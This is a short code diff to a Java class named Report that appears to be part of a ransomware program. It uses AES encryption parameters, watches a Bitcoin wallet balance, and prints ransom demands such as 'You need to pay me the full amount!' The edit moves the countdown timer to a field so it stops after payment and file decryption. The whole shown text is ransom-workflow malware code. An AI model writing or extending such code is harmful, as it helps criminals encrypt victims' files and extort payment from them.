@@ -28,6 +28,7 @@ public class Report implements IReport {
     private boolean isEncrypted;
     private double amount;
     private int minute;
+    Timer timer;
 
 
     public Report() {
@@ -42,6 +43,7 @@ public class Report implements IReport {
         this.isEncrypted = false;
         this.amount = 0.02755;
         this.minute = 0;
+        this.timer = new Timer();
 
         // AES - Cryptography Params
         try {
@@ -86,6 +88,7 @@ public class Report implements IReport {
             if ((wallet.getBalance() >= (this.initialBalance + amount)) && Network.getInstance().isChainValid()) {
                 System.out.println("Transaction successful! Your files will be decrypted.");
                 startDecryption();
+                timer.cancel();
             } else {
                 System.out.println("You need to pay me the full amount!");
                 System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - wallet.getBalance()));
@@ -151,8 +154,6 @@ public class Report implements IReport {
     }
 
     private void startTimer() {
-        Timer timer = new Timer();
-
         timer.schedule(new TimerTask() {
             public void run() {
                 switch (minute) {
